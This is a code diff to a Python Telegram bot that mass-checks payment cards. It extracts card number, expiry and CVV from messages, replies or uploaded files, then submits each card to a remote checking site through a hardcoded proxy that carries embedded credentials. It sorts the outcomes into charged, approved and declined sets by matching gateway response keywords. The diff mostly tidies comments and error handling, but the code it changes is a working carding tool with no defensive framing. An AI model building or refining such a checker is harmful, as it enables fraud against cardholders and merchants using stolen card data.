@@ -5475,7 +5475,7 @@ logging.basicConfig(level=logging.INFO)
 # In-memory cooldowns
 last_msp_usage: Dict[int, float] = {}
 
-# Flexible regex: supports |, /, :, or spaces as separators
+# Regex: supports |, /, :, or spaces
 CARD_REGEX = re.compile(
     r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
 )
@@ -5483,10 +5483,8 @@ CARD_REGEX = re.compile(
 # Proxy placeholder
 DEFAULT_PROXY = "142.147.128.93:6593:fvbysspi:bsbh3trstb1c"
 
-# Junk/error response patterns
+# Response classification
 ERROR_PATTERNS = ["CLINTE TOKEN", "DEL AMMOUNT EMPTY", "PRODUCT ID IS EMPTY"]
-
-# Classification keyword groups
 CHARGED_KEYWORDS = {"THANK YOU", "ORDER_PLACED", "APPROVED", "SUCCESS", "CHARGED", "INSUFFICIENT_FUNDS"}
 APPROVED_KEYWORDS = {"3D_AUTHENTICATION", "INCORRECT_CVC", "INCORRECT_ZIP"}
 DECLINED_KEYWORDS = {"INVALID_PAYMENT_ERROR", "DECLINED", "CARD_DECLINED", "INCORRECT_NUMBER", "FRAUD_SUSPECTED", "EXPIRED_CARD", "EXPIRE_CARD"}
@@ -5495,24 +5493,15 @@ DECLINED_KEYWORDS = {"INVALID_PAYMENT_ERROR", "DECLINED", "CARD_DECLINED", "INCO
 # ---------- Utility ----------
 
 def extract_cards_from_text(text: str) -> List[str]:
-    """
-    Extract and normalize cards from text.
-    Supports formats with |, /, :, or spaces.
-    Returns list of cards in normalized form: card|mm|yy|cvv
-    """
+    """Extract cards in normalized form: card|mm|yyyy|cvv"""
     cards: List[str] = []
     for match in CARD_REGEX.finditer(text):
-        try:
-            card, mm, yy, cvv = match.groups()
-            mm = mm.zfill(2)
-            # Normalize year → always 4 digits
-            if len(yy) == 2:
-                yy = "20" + yy
-            normalized = f"{card}|{mm}|{yy}|{cvv}"
-            cards.append(normalized)
-        except Exception as e:
-            logger.warning(f"[extract_cards_from_text] Skipped bad match: {e}")
-            continue
+        card, mm, yy, cvv = match.groups()
+        mm = mm.zfill(2)
+        if len(yy) == 2:
+            yy = "20" + yy
+        normalized = f"{card}|{mm}|{yy}|{cvv}"
+        cards.append(normalized)
     return cards
 
 
@@ -5549,12 +5538,7 @@ async def check_card(session: httpx.AsyncClient, base_url: str, site: str, card:
         try:
             data = r.json()
         except Exception:
-            return {
-                "response": r.text or "Unknown",
-                "status": "false",
-                "price": "0",
-                "gateway": "N/A",
-            }
+            return {"response": r.text or "Unknown", "status": "false", "price": "0", "gateway": "N/A"}
         return {
             "response": str(data.get("Response", "Unknown")),
             "status": str(data.get("Status", "false")),
@@ -5562,12 +5546,7 @@ async def check_card(session: httpx.AsyncClient, base_url: str, site: str, card:
             "gateway": str(data.get("Gateway", "N/A")),
         }
     except Exception as e:
-        return {
-            "response": f"Error: {str(e)}",
-            "status": "false",
-            "price": "0",
-            "gateway": "N/A",
-        }
+        return {"response": f"Error: {str(e)}", "status": "false", "price": "0", "gateway": "N/A"}
 
 
 # ---------- Buttons ----------
@@ -5679,8 +5658,8 @@ async def run_msp(update: Update, context: ContextTypes.DEFAULT_TYPE, cards: Lis
                     f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                 )
                 await msg.edit_text(summary_text, parse_mode="HTML", disable_web_page_preview=True, reply_markup=buttons)
-            except Exception as e:
-                logger.warning(f"Edit failed: {e}")
+            except Exception:
+                pass
 
             await asyncio.sleep(0.5)
 
@@ -5733,10 +5712,14 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
 
     cards: List[str] = []
 
+    # Try args first
     if context.args:
-        cards = extract_cards_from_text(" ".join(context.args))
+        raw_text = " ".join(context.args)
+        cards = extract_cards_from_text(raw_text)
+    # If no args, maybe reply-to text
     elif update.message.reply_to_message and update.message.reply_to_message.text:
         cards = extract_cards_from_text(update.message.reply_to_message.text)
+    # If reply-to document
     elif update.message.reply_to_message and update.message.reply_to_message.document:
         try:
             file_obj = await update.message.reply_to_message.document.get_file()
